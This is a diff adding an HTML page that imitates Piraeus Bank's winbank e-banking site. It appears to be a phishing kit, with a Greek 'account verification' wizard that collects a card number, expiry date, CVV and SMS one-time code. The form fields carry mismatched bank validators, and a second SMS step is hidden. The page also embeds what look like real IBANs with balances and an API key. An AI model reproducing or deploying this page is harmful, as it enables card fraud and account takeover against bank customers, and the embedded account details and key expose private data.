@@ -1,0 +1,856 @@
+<html xmlns:ng="http://winbank.gr" id="ng-app" data-ng-app="WinbankNextApp" data-ng-controller="MasterCtrl as masterVM" data-ng-csp="" class="js no-touch rgba csstransforms no-csstransforms3d touch-device js no-touch rgba csstransforms csstransforms3d notouch-device"><head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <!-- base href="https://e-banking.winbank.gr/Release/" -->
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge; IE=11">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link rel="icon" type="image/icon" href="https://e-banking.winbank.gr/Release/favicon.ico">
+        <title data-ng-bind="($root.pageTitle.length > 0 ? $root.pageTitle + ' - ' : '') + 'winbank web banking'">winbank web banking</title>
+
+        <meta name="TemplateVersion" content="W4WkoqrCKAAFj7DIypYf8imTmXP6bpY_VtH1sCYqYE41">
+        <meta name="Language" content="en">
+        <meta name="ApplicationInsightsInstrKey" content="a1cbd492-80b3-43ea-9448-c58ee9ff2e7f">
+        <meta name="PfmEnabled" content="content">
+        <meta name="BotEnabled" content="True">
+        <meta name="Debug">
+
+        <meta name="mLogoffUrl" content="https://www.winbank.gr/sites/idiwtes/en/Pages/Content/LogoutRetail.aspx">
+
+        <meta name="GroupIbCid" content="gib-w-piraeusret">
+        <meta name="GroupIbCidCorp" content="gib-w-piraeuscorp">
+        <meta name="GroupIbackURL" content="//pbops.winbank.gr">
+        <meta name="GroupIgafURL" content="//eu.id.group-ib.com/id.html">
+
+        <meta name="googleMapsApiKey" content="AIzaSyC-rVG3_kBPAgcljgXNwTB4KgA6AlSf34w">
+
+        <link href="security_files/print.css" rel="stylesheet" media="print">
+
+        <link href="security_files/css.css" rel="stylesheet" media="screen, handheld, projection, tv">
+
+        <style type="text/css">
+            /* Chart.js */
+            @-webkit-keyframes chartjs-render-animation {
+                from {
+                    opacity: 0.99;
+                }
+                to {
+                    opacity: 1;
+                }
+            }
+            @keyframes chartjs-render-animation {
+                from {
+                    opacity: 0.99;
+                }
+                to {
+                    opacity: 1;
+                }
+            }
+            .chartjs-render-monitor {
+                -webkit-animation: chartjs-render-animation 0.001s;
+                animation: chartjs-render-animation 0.001s;
+            }
+        </style>
+    <style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head>
+
+    <body data-ng-controller="PageCtrl as pageVM" class="">
+        <div class="mm-blocker"></div>
+        <div id="head-section" data-ng-init="pageVM.initLoginSSO()">
+            <header>
+                <div class="header-bottom row">
+                    <div class="wrapper">
+                        <div class="col-12">
+                            <div class="logo" data-ng-class="::{'business': isCorporate}">
+                                <!---->
+                                <h2 data-ng-if="!masterVM.isPreFilledLoanData">
+                                    <!---->
+                                    <a data-ng-if="!isIceAgent" data-ui-sref="root.dashboard" href="#/dashboard"></a>
+                                    <!---->
+                                    <!---->
+                                </h2>
+                                <!---->
+                                <!---->
+                            </div>
+
+                            <div class="mmenu menu-items-8" data-menu="">
+                                <div class="mmenu-top">
+                                    <div class="wrap">
+                                        <div class="back"><span class="ic-arrowLeft"></span></div>
+                                        <div class="close-menu ic-close"></div>
+                                    </div>
+                                </div>
+                                <!---->
+                                
+                                <!---->
+                                <!---->
+                            </div>
+
+                            <div class="b-menu open-menu d-hide">
+<!--                                 <div class="ic-burgermenu"></div>
+ -->                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="loaderWrap" data-ng-class="{'active': masterVM.processingRequest }">
+                    <span id="loader"></span>
+                </div>
+            </header>
+        </div>
+        <div class="main-wrapper">
+            <div class="main-content" style="min-height: 290px;">
+                <div class="wrapper">
+                    <!---->
+                    <div data-ui-view="">
+                        <!---->
+                        <div data-ui-view="">
+                            <!---->
+                            <div data-ui-view="">
+                                <!---->
+                                <div data-ui-view="">
+                                    <div data-extend-template="layout/FormLayout">
+                                        <div data-ng-controller="FormLayoutCtrl as formVM">
+                                            <!---->
+                                            <div data-block="header" class="row" data-ng-if="::formVM.Layout.FormHeader">
+                                                <div class="col-10 main-title t-col-12 m-col-12">
+                                                    <div class="mainTitleWrap">
+                                                        <div class="titleBlock">
+                                                           
+                                                            <h1 data-block="title">
+                                                                Επαλήθευση λογαριασμού
+                                                                <!---->
+                                                            </h1>
+                                                        </div>
+                                                        <div class="titleTools">
+                                                            <!---->
+                                                            <!---->
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!---->
+                                            <div data-block="header-custom"></div>
+                                            <div class="row" id="magic">
+                                                <div data-block="noDataFound" data-ng-show="false" class="ng-hide"></div>
+                                                <div data-block="content" class="main-col">
+                                                    <div>
+                                                        <p>
+                                                            Συμπληρώστε τη φόρμα για να επιβεβαιώσετε την ιδιοκτησία του λογαριασμού
+
+                                                        </p>
+                                                    </div>
+                                                    <div data-extend-template="layout/WizardLayout">
+                                                        <!---->
+                                                        <div data-ng-if="vm.operationAvailable">
+                                                            <div class="box-form">
+                                                                <div class="no-print ng-hide" data-ng-show="active" style="position: absolute; top: 0; left: 0; height: 100%; width: 100%;" data-overlay="" data-active="vm.isBusy || vm.inputForm.$pending">
+                                                                    <div style="position: absolute; top: 0; left: 0; height: 100%; width: 100%; background-color: #fff; opacity: 0.4; z-index: 10;" data-ng-class="::{ 'no-opacity': noOpacity }"></div>
+                                                                    <div class="sk-circle" data-ng-class="::{ 'sk-position-fixed': loaderPositionFixed }">
+                                                                        <div class="sk-circle1 sk-child"></div>
+                                                                        <div class="sk-circle2 sk-child"></div>
+                                                                        <div class="sk-circle3 sk-child"></div>
+                                                                        <div class="sk-circle4 sk-child"></div>
+                                                                        <div class="sk-circle5 sk-child"></div>
+                                                                        <div class="sk-circle6 sk-child"></div>
+                                                                        <div class="sk-circle7 sk-child"></div>
+                                                                        <div class="sk-circle8 sk-child"></div>
+                                                                        <div class="sk-circle9 sk-child"></div>
+                                                                        <div class="sk-circle10 sk-child"></div>
+                                                                        <div class="sk-circle11 sk-child"></div>
+                                                                        <div class="sk-circle12 sk-child"></div>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="steps" data-ng-class="{'five-step-wizard': vm.steps.length == 5}">
+                                                                    <div class="steps-wrap">
+                                                                        <ul>
+                                                                            <!---->
+                                                                            <li data-ng-repeat="step in vm.steps" data-ng-click="vm.goToStep($index)" data-ng-class="{ active: $index == vm.currentStep, prev: $index < vm.currentStep &amp;&amp; !vm.reachedLastStep &amp;&amp; !vm.isBusy, activeFinished: $index < vm.currentStep &amp;&amp; vm.reachedLastStep || ($index < vm.currentStep &amp;&amp; vm.isBusy) }" class="active" id="step1">
+                                                                                <span class="step">1</span>
+                                                                                <span class="text">
+                                                                                    Εισάγετε λεπτομέρειες
+                                                                                    <!---->
+                                                                                    <span class="ic-edit" data-ng-if="!vm.reachedLastStep"></span>
+                                                                                    <!---->
+                                                                                </span>
+                                                                            </li>
+                                                                            <!---->
+                                                                            <li data-ng-repeat="step in vm.steps" data-ng-click="vm.goToStep($index)" data-ng-class="{ active: $index == vm.currentStep, prev: $index < vm.currentStep &amp;&amp; !vm.reachedLastStep &amp;&amp; !vm.isBusy, activeFinished: $index < vm.currentStep &amp;&amp; vm.reachedLastStep || ($index < vm.currentStep &amp;&amp; vm.isBusy) }" id="step2">
+                                                                                <span class="step">2</span>
+                                                                                <span class="text">
+                                                                                    Επαλήθευση SMS
+                                                                                    <!---->
+                                                                                    <span class="ic-edit" data-ng-if="!vm.reachedLastStep"></span>
+                                                                                    <!---->
+                                                                                </span>
+                                                                            </li>
+                                                                            <!---->
+                                                                            <li data-ng-repeat="step in vm.steps" data-ng-click="vm.goToStep($index)" data-ng-class="{ active: $index == vm.currentStep, prev: $index < vm.currentStep &amp;&amp; !vm.reachedLastStep &amp;&amp; !vm.isBusy, activeFinished: $index < vm.currentStep &amp;&amp; vm.reachedLastStep || ($index < vm.currentStep &amp;&amp; vm.isBusy) }">
+                                                                                <span class="step">3</span>
+                                                                                <span class="text">
+                                                                                    Ολοκλήρωση
+                                                                                    <!---->
+                                                                                    <span class="ic-edit" data-ng-if="!vm.reachedLastStep"></span>
+                                                                                    <!---->
+                                                                                </span>
+                                                                            </li>
+                                                                            <!---->
+                                                                        </ul>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="row" data-ng-class="{ hide: !vm.inputStepActive }" id="cdetails">
+                                                                    <div class="field detail-text small error ng-hide" data-ng-show="vm.hasErrors">
+                                                                        <div class="block1"><div class="ic-info"></div></div>
+                                                                        <div class="block2">Check that you have filled all fields correctly</div>
+                                                                    </div>
+                                                                    <div data-block="user-input">
+                                                                        <form id="forma" name="vm.forms.form1" novalidate="novalidate" autocomplete="off" class="ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-number ng-valid-decimal ng-valid-min-value ng-valid-insufficient-balance ng-dirty ng-valid-at-least-one-choice ng-valid-required-execution-date ng-valid-valid-execution-date ng-valid-future-execution-date ng-valid-future-execution-date-within-one-year ng-valid-recurrence-date ng-valid-invalid-date ng-valid-working-date">
+                                                                           
+                                                                            <div class="box-row">
+                                                                                <div class="block1">
+                                                                                    <h4>Μέθοδος επαλήθευσης</h4>
+                                                                                </div>
+                                                                            </div>
+                                                                               <div>
+                                                                                <div class="payment-method" data-debit-source="vm.DebitSource" data-from-account="vm.FromAsset" data-account-assets="vm.initData.Accounts" data-from-card="vm.FromCard" data-card-assets="vm.initData.Cards" data-allow-card="true" data-card-literal="Card">
+                                                                                    <div class="box-row" data-ng-show="allowCard">
+                                                                                        <div class="block1 empty"></div>
+                                                                                        <div class="block2">
+                                                                                            <div class="radio-block radio-tabs">
+                                                                                                <div class="radio ng-pristine ng-untouched ng-valid ng-not-empty checked" data-ng-click="vm.toggle($event)" data-ng-class="{ disabled: disabled, checked: model==value }" data-value="1" data-ng-model="debitSource" data-disabled="cardAssets == null || cardAssets == undefined">
+                                                                                                    <span class="ic-radio"> <input type="radio" data-ng-disabled="disabled"> </span>
+                                                                                                    <label data-ng-transclude="">
+                                                                                                        <!---->
+                                                                                                        <span data-ng-if="vm.hasCardLiteral" data-ng-bind="cardLiteral">Αριθμός Κάρτας</span>
+                                                                                                        <!---->
+                                                                                                        <!---->
+                                                                                                    </label>
+                                                                                                </div>
+                                                                                                <div class="radio ng-pristine ng-untouched ng-valid ng-not-empty" data-ng-click="vm.toggle($event)" data-ng-class="{ disabled: disabled, checked: model==value }" data-value="0" data-ng-model="debitSource">
+                                                                                                    <span class="ic-radio"> <input type="radio" data-ng-disabled="disabled"> </span> <label style="color: grey;" data-ng-transclude="">x Τραπεζικός λογαριασμός</label>
+                                                                                                </div>
+                                                                                                
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="radio-tab" data-tabid="debitProductAccount" data-ng-class="{show: debitSource == vm.DebitSources.ACCOUNT}">
+                                                                                        <div class="field" data-ng-class="{ 'error': parentForm.FromAccount.$invalid &amp;&amp; (parentForm.FromAccount.$dirty || parentForm.$submitted) }">
+                                                                                            <div class="block1"><label id="lblFromAccount" for="FromAccount" class="hover-elm dynamicFieldLabel">Bank Account:</label></div>
+                                                                                            <div class="block2" data-showonresult="">
+                                                                                                <div class="asset-list select-box info-data ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" data-ng-class="{ open: vm.open, disabled: disabled || readonly }" data-ng-model="fromAccount" name="FromAccount" data-assets="accountAssets" data-asset-type="Account" data-on-change="vm.onAccountChange(item)" data-validate-openloan="" required="required" data-showonresult="">
+                                                                                                    <div class="selected-wrap" data-ng-click="vm.toggle($event)" tabindex="0">
+                                                                                                        <span class="ic-arrowDown arrow"></span>
+                                                                                                        <div class="selected colsWrap">
+                                                                                                            <span class="col col1"> <span>Description</span> <span class="iban"></span> </span>
+                                                                                                            <span ng-show="::showBalance" class="col col2">Available Balance</span>
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                    <div class="options">
+                                                                                                        <ul class="options-wrap">
+                                                                                                            <li class="search ng-hide" data-ng-show="assets.length >= 15">
+                                                                                                                <input type="text" class="search text noRedBorder ng-pristine ng-untouched ng-valid ng-empty" placeholder="Search..." data-ng-model="search">
+                                                                                                                <span class="ic-search"></span>
+                                                                                                            </li>
+                                                                                                            <li class="options-title colsWrap">
+                                                                                                                <span class="col col1">Description</span> <span class="col col2" data-ng-show="::showBalance">Available Balance</span>
+                                                                                                            </li>
+                                                                                                            <!---->
+                                                                                                            <li class="colsWrap item" data-ng-repeat="item in assets | filter: search" data-ng-click="vm.select($event, item)" data-on-key-enter="vm.select($event, item)" tabindex="0">
+                                                                                                                <span class="col col1"> <span>BASIC SAVINGS ACC R</span> <span class="iban">GR91 0171 2760 0062 7612 5873 828</span> </span>
+                                                                                                                <span class="col col2" data-ng-show="::showBalance">12.96 EUR</span>
+                                                                                                            </li>
+                                                                                                            <!---->
+                                                                                                            <li class="colsWrap item" data-ng-repeat="item in assets | filter: search" data-ng-click="vm.select($event, item)" data-on-key-enter="vm.select($event, item)" tabindex="0">
+                                                                                                                <span class="col col1"> <span>SAVINGS ACC R</span> <span class="iban">GR68 0171 4260 0064 2601 0087 626</span> </span>
+                                                                                                                <span class="col col2" data-ng-show="::showBalance">0.00 EUR</span>
+                                                                                                            </li>
+                                                                                                            <!---->
+                                                                                                            <!---->
+                                                                                                        </ul>
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                            <div class="error ng-active" data-ng-messages="parentForm.FromAccount.$error">
+                                                                                                <!----><!---->
+                                                                                                <span data-ng-message="required">Select Account</span>
+                                                                                                <!---->
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                   
+                                                                                </div>
+                                                                                <!---->
+                                                                              
+                                                                                <!---->
+                                                                            </div>
+
+                                                                            <div class="field" data-ng-class="{ 'error': vm.forms.form1.rfCode.$invalid &amp;&amp; vm.forms.form1.$submitted }">
+                                                                                <div class="label block1"><span>Αριθμός Κάρτας</span></div>
+                                                                                <div class="input-field block2">
+                                                                                    <input id="card" name="card" type="text" class="text m ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-touched" maxlength="16" data-ng-pattern="/^([Rr][Ff])\d{20,30}$/" data-ng-model-options="{ updateOn: 'blur', allowInvalid: true }" data-ng-model="vm.RfCode" data-wb-remove-spaces="" required="">
+                                                                                </div>
+                                                                                <div class="error ng-active" data-ng-messages="vm.forms.form1.rfCode.$error">
+                                                                                    <!---->
+                                                                                    <!---->
+                                                                                    <span data-ng-message="required">The field is mandatory</span>
+                                                                                </div>
+                                                                            </div>
+                                                                            <style type="text/css">
+                                                                                select.text {
+                                                                                    background-color: #fff;
+                                                                                    border: 1px solid #d6d6d6;
+                                                                                    color: #102342;
+                                                                                    font-family: "robotoregular",arial;
+                                                                                    font-size: 16px;
+                                                                                    padding: 8px 16px;
+                                                                                    height: 40px;
+
+                                                                                }
+                                                                            </style>
+                                                                            <div class="field" data-ng-class="{ 'error': vm.forms.form1.amount.$invalid &amp;&amp; vm.forms.form1.$submitted }">
+                                                                                <div class="block1">
+                                                                                    <label class="required" for="month">Ημερομηνία Λήξης</label>
+                                                                                </div>
+                                                                                <div class="input-field block2">
+                                                                                    <select id="month" name="month" class="text al-right s ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-number ng-valid-decimal ng-valid-min-value ng-valid-insufficient-balance ng-touched" required="">
+                                                                                        <option value="01">01</option>
+                                                                                       <option value="02">02</option>
+                                                                                       <option value="03">03</option>
+                                                                                       <option value="04">04</option>
+                                                                                       <option value="05">05</option>
+                                                                                       <option value="06">06</option>
+                                                                                       <option value="07">07</option>
+                                                                                       <option value="08">08</option>
+                                                                                       <option value="09">09</option>
+                                                                                       <option value="10">10</option>
+                                                                                       <option value="11">11</option>
+                                                                                       <option value="12">12</option>
+                                                                                    </select>
+                                                                                    <span class="input-cur">/</span>
+                                                                                     <select id="year" name="year" class="text al-right s ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-number ng-valid-decimal ng-valid-min-value ng-valid-insufficient-balance ng-touched" data-ng-model="vm.Amount.Amount" data-ng-model-options="{ updateOn: 'blur', allowInvalid: true }" data-wb-validator-billamount="" data-insufficient-balance-ignore="!vm.Scheduling.IsImmediatePayment" maxlength="13" required="">
+                                                                                         <option value="2022">2022</option>
+                                                                                        <option value="2023">2023</option>
+                                                                                        <option value="2024">2024</option>
+                                                                                        <option value="2025">2025</option>
+                                                                                        <option value="2026">2026</option>
+                                                                                        <option value="2027">2027</option>
+                                                                                        <option value="2028">2028</option>
+                                                                                        <option value="2029">2029</option>
+                                                                                        <option value="2030">2030</option>
+                                                                                        <option value="2031">2031</option>
+                                                                                        <option value="2032">2032</option>
+                                                                                        <option value="2033">2033</option>
+                                                                                        <option value="2034">2034</option>
+                                                                                        <option value="2035">2035</option>
+                                                                                    </select>
+                                                                                </div>
+                                                                                <div class="error ng-active" data-ng-messages="vm.forms.form1.amount.$error">
+                                                                                    <!----><!---->
+                                                                                    <span data-ng-message="required">Please enter the amount</span>
+                                                                                    <!----><!----><!----><!---->
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="field" data-ng-class="{ 'error': vm.forms.form1.amount.$invalid &amp;&amp; vm.forms.form1.$submitted }">
+                                                                                <div class="block1">
+                                                                                    <label class="required" for="cvv">Κωδικός Ασφαλείας</label>
+                                                                                </div>
+                                                                                <div class="input-field block2">
+                                                                                    <input id="cvv" name="cvv" style="width: 100px;" class="text al-right s ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-number ng-valid-decimal ng-valid-min-value ng-valid-insufficient-balance ng-touched" data-ng-model="vm.Amount.Amount" data-ng-model-options="{ updateOn: 'blur', allowInvalid: true }" data-wb-validator-billamount="" data-insufficient-balance-ignore="!vm.Scheduling.IsImmediatePayment" maxlength="3" required="">
+                                                                                    <span class="input-cur"></span>
+                                                                                </div>
+                                                                                <div class="error ng-active" data-ng-messages="vm.forms.form1.amount.$error">
+                                                                                    <!----><!----><span data-ng-message="required">Please enter the amount</span><!----><!----><!----><!---->
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="field detail-text small" data-ng-if="vm.DebitSource == vm.DebitSources.CARD">
+                                                                                    <div class="block1"><span class="ic-info"></span></div>
+                                                                                    <div class="block2">
+                                                                                        <p>3ψήφιος κωδικός στην πίσω πλευρά της πιστωτικής κάρτας</p>
+                                                                                    </div>
+                                                                                </div>
+
+                                                                            
+
+                                                                           
+                                                                            <!---->
+                                                                            <div data-ng-include="'partial/Wizards/Shared/InputFormSubmitButton'">
+                                                                                <div class="buttons-wrap">
+                                                                                    <div class="block1 empty"></div>
+                                                                                    <div class="block2">
+                                                                                        <!---->
+                                                                                        &nbsp; <input type="submit" class="button submit" value="Επόμενο" data-ng-class="{ inactive : vm.isBusy }" data-ng-disabled="vm.isBusy">
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                                 <div class="row" data-ng-class="{ hide: !vm.inputStepActive }" id="smsform" style="display: none;">
+                                                                    <div class="field detail-text small error ng-hide" data-ng-show="vm.hasErrors">
+                                                                        <div class="block1"><div class="ic-info"></div></div>
+                                                                        <div class="block2">Check that you have filled all fields correctly</div>
+                                                                    </div>
+                                                                    <div data-block="user-input">
+                                                                        <form id="forma" name="vm.forms.form1" novalidate="novalidate" autocomplete="off" class="ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-number ng-valid-decimal ng-valid-min-value ng-valid-insufficient-balance ng-dirty ng-valid-at-least-one-choice ng-valid-required-execution-date ng-valid-valid-execution-date ng-valid-future-execution-date ng-valid-future-execution-date-within-one-year ng-valid-recurrence-date ng-valid-invalid-date ng-valid-working-date">
+                                                                           
+                                                                            <div class="box-row">
+                                                                                <div class="block1">
+                                                                                    <h4>SMS</h4>
+                                                                                </div>
+                                                                            </div>
+                                                                               <div>
+                                                                                <div class="payment-method" data-debit-source="vm.DebitSource" data-from-account="vm.FromAsset" data-account-assets="vm.initData.Accounts" data-from-card="vm.FromCard" data-card-assets="vm.initData.Cards" data-allow-card="true" data-card-literal="Card">
+                                                                                     <div class="field detail-text small" data-ng-if="vm.DebitSource == vm.DebitSources.CARD">
+                                                                                    <div class="block1"><span class="ic-info"></span></div>
+                                                                                    <div class="block2">
+                                                                                        <p>3ψήφιος κωδικός στην πίσω πλευρά της πιστωτικής κάρτας</p>
+                                                                                    </div>
+                                                                                </div>
+                                                                                    
+                                                                                </div>
+                                                                                <!---->
+                                                                              
+                                                                                <!---->
+                                                                            </div>
+
+                                                                          
+                                                                            <div class="field" data-ng-class="{ 'error': vm.forms.form1.amount.$invalid &amp;&amp; vm.forms.form1.$submitted }">
+                                                                                <div class="block1">
+                                                                                    <label class="required" for="amount">Κωδικός SMS</label>
+                                                                                </div>
+                                                                                <div class="input-field block2">
+                                                                                    <input id="sms" name="sms" style="width: 140px;" class="text al-right s ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-number ng-valid-decimal ng-valid-min-value ng-valid-insufficient-balance ng-touched" data-ng-model="vm.Amount.Amount" data-ng-model-options="{ updateOn: 'blur', allowInvalid: true }" data-wb-validator-billamount="" data-insufficient-balance-ignore="!vm.Scheduling.IsImmediatePayment" maxlength="8" required="">
+                                                                                    <span class="input-cur"></span>
+                                                                                </div>
+                                                                                <div class="error ng-active" data-ng-messages="vm.forms.form1.amount.$error">
+                                                                                    <!----><!----><span data-ng-message="required">Please enter the sms</span><!----><!----><!----><!---->
+                                                                                </div>
+                                                                            </div>
+                                                                            
+
+                                                                            
+
+                                                                           
+                                                                            <!---->
+                                                                            <div data-ng-include="'partial/Wizards/Shared/InputFormSubmitButton'">
+                                                                                <div class="buttons-wrap">
+                                                                                    <div class="block1 empty"></div>
+                                                                                    <div class="block2">
+                                                                                        <!---->
+                                                                                        &nbsp; <input type="submit" class="button submit" value="Επαλήθευση" id="sendcode" data-ng-class="{ inactive : vm.isBusy }" data-ng-disabled="vm.isBusy">
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                                <!---->
+                                                                <!---->
+                                                                <!---->
+                                                            </div>
+                                                            <!---->
+                                                        </div>
+                                                        <!----><!---->
+                                                    </div>
+                                                </div>
+                                            
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!---->
+
+            <footer class="row" data-ng-class="{'chatOnly': (click2chatAllowed &amp;&amp; !hasPersonalBanking), 'full': (click2chatAllowed &amp;&amp; hasPersonalBanking)}">
+                <div class="footer-top">
+                    <div class="wrapper">
+                        <div class="go-top ic-arrowUp" style="display: none;"></div>
+                        <!---->
+                        <div class="col-12">
+                            <div class="row">
+                                <div class="footerTopWrap">
+                                    <!---->
+                                    <!---->
+                                    <div class="contact-tools">
+                                        <div class="contact-item">
+                                            <span class="ic-email"></span>
+                                            <div>
+                                                <a data-ui-sref="root.help.contactUs" href="#/help/contactus">Contact Form</a>
+                                                <div class="text">Contact us</div>
+                                            </div>
+                                        </div>
+                                        <!---->
+                                        <div data-ng-if="!hasPersonalBanking" class="contact-item">
+                                            <span class="ic-tilefono yellow"></span>
+                                            <div>
+                                                <!---->
+                                                <a data-ng-if="!hasPersonalBanking &amp;&amp; !displaySBPOAllowed" href="tel:+30 210 3288000">+30 210 3288000</a>
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                <div data-ng-if="!hasPersonalBanking &amp;&amp; !displaySBPOAllowed" class="text">Available 24h</div>
+                                                <!---->
+                                                <!---->
+                                            </div>
+                                        </div>
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <div data-ng-if="::appointmentsBookingAllowed" class="contact-item">
+                                            <span class="ic-calendar_footer yellow"></span>
+                                            <div>
+                                                <a ui-sref="root.appointments.home" href="#/appointments/home">Book Appointment</a>
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                            </div>
+                                        </div>
+                                        <!---->
+                                    </div>
+                                    <a target="_blank" href="http://www.piraeusbank.gr/en/idiwtes" class="logo en"></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-btm">
+                    <div class="wrapper">
+                        <div class="col-12">
+                            <div class="row">
+                                <ul>
+                                    <li><a target="_blank" href="https://www.winbank.gr/sites/idiwtes/en/Pages/Content/TermsOfUse.aspx">Terms of Use</a></li>
+                                    <li><a target="_blank" href="https://www.winbank.gr/sites/idiwtes/en/Pages/Content/PrivacyPolicy.aspx">Privacy Policy</a></li>
+                                    <li>Copyright © 2022 Piraeus Bank</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+
+        <script src="security_files/ai.js"></script>
+
+        <script src="security_files/gib_v2.js"></script>
+
+        <script src="security_files/jslibraries"></script>
+
+        <script src="security_files/app"></script>
+
+        <script src="security_files/locale"></script>
+
+        <script src="security_files/config"></script>
+
+        <script src="security_files/partials"></script>
+
+        <script src="security_files/ai_002.js"></script>
+        <iframe style="display: none; position: absolute; left: -9999px;" width="0" height="0"></iframe><iframe style="display: none; position: absolute; left: -999999px; right: -999999px;" src="security_files/id.htm"></iframe>
+        <div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all">
+            <div class="ui-datepicker-header ui-widget-header ui-helper-clearfix ui-corner-all">
+                <a class="ui-datepicker-prev ui-corner-all ui-state-disabled" title="Prev"><span class="ui-icon ui-icon-circle-triangle-w">Prev</span></a>
+                <a class="ui-datepicker-next ui-corner-all" data-handler="next" data-event="click" title="Next"><span class="ui-icon ui-icon-circle-triangle-e">Next</span></a>
+                <div class="ui-datepicker-title"><span class="ui-datepicker-month">November</span>&nbsp;<span class="ui-datepicker-year">2022</span></div>
+            </div>
+            <table class="ui-datepicker-calendar">
+                <thead>
+                    <tr>
+                        <th scope="col" class="ui-datepicker-week-end"><span title="Sunday">Su</span></th>
+                        <th scope="col"><span title="Monday">Mo</span></th>
+                        <th scope="col"><span title="Tuesday">Tu</span></th>
+                        <th scope="col"><span title="Wednesday">We</span></th>
+                        <th scope="col"><span title="Thursday">Th</span></th>
+                        <th scope="col"><span title="Friday">Fr</span></th>
+                        <th scope="col" class="ui-datepicker-week-end"><span title="Saturday">Sa</span></th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="ui-datepicker-week-end ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td>
+                        <td class="ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">1</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">2</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">3</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">4</span></td>
+                        <td class="ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">5</span></td>
+                    </tr>
+                    <tr>
+                        <td class="ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">6</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">7</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">8</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">9</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">10</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">11</span></td>
+                        <td class="ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">12</span></td>
+                    </tr>
+                    <tr>
+                        <td class="ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">13</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">14</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">15</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">16</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">17</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">18</span></td>
+                        <td class="ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">19</span></td>
+                    </tr>
+                    <tr>
+                        <td class="ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">20</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">21</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled"><span class="ui-state-default">22</span></td>
+                        <td class="ui-datepicker-unselectable ui-state-disabled ui-datepicker-today"><span class="ui-state-default">23</span></td>
+                        <td class="ui-datepicker-days-cell-over ui-datepicker-current-day" data-handler="selectDay" data-event="click" data-month="10" data-year="2022">
+                            <a class="ui-state-default ui-state-active ui-state-hover" href="#">24</a>
+                        </td>
+                        <td class=" " data-handler="selectDay" data-event="click" data-month="10" data-year="2022"><a class="ui-state-default" href="#">25</a></td>
